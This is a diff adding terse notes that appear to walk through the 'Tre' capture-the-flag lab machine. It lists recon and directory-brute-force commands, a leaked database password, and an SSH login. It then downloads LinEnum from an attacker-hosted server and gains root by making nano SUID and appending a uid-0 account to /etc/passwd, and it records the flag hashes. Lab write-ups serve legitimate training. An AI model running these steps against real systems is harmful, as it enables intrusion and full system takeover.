@@ -1,0 +1,64 @@
+Tre
+
+ping 192.168.65.84
+
+sudo autorecon --only-scans-dir -v 192.168.65.84
+
+http://192.168.65.84/adminer.php
+
+feroxbuster -u http://192.168.65.84 -w /usr/share/wordlists/dirb/big.txt 
+
+http://192.168.65.84/mantisbt/vendor/composer 
+http://192.168.65.84/mantisbt/scripts
+http://192.168.65.84/mantisbt/admin/check 
+http://192.168.65.84/mantisbt/config
+http://192.168.65.84/mantisbt/config/a.txt
+
+# --- Database Configuration ---
+$g_hostname      = 'localhost';
+$g_db_username   = 'mantissuser';
+$g_db_password   = 'password@123AS';
+$g_database_name = 'mantis';
+$g_db_type       = 'mysqli';
+
+http://192.168.65.84/adminer.php
+Login
+
+http://192.168.65.84/adminer.php?username=mantissuser&db=mantis&select=mantis_user_table
+
+ssh tre@192.168.65.84
+Password: Tr3@123456A!
+sudo -l
+
+wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+
+python -m http.server
+
+wget http://192.168.49.65:8000/LinEnum.sh
+
+local.txt
+bb00e79f4412e208535f4f764e22a5f0
+
+chmod +x Linenum.sh
+./Linenum
+cd .usr/bin
+ls -la check-system
+nano check-system
+
+add line no 3
+chmod +s /usr/bin/nano
+sudo shutdown -r now
+ls -la /usr/bin/nano
+nano /etc/passwd
+
+openssl passwd -1 -salt user3 pass123
+
+faizee:$1$user3$rAGRVf5p2jYTqtqOW5cPu/:0:0::/root:/bin/bash
+
+tail -n 2 /etc/passwd
+su faizee
+Password: pass123
+cd /root
+ls
+cat proof.txt
+ebf247aeac94c7fbd3beb60473a15f32
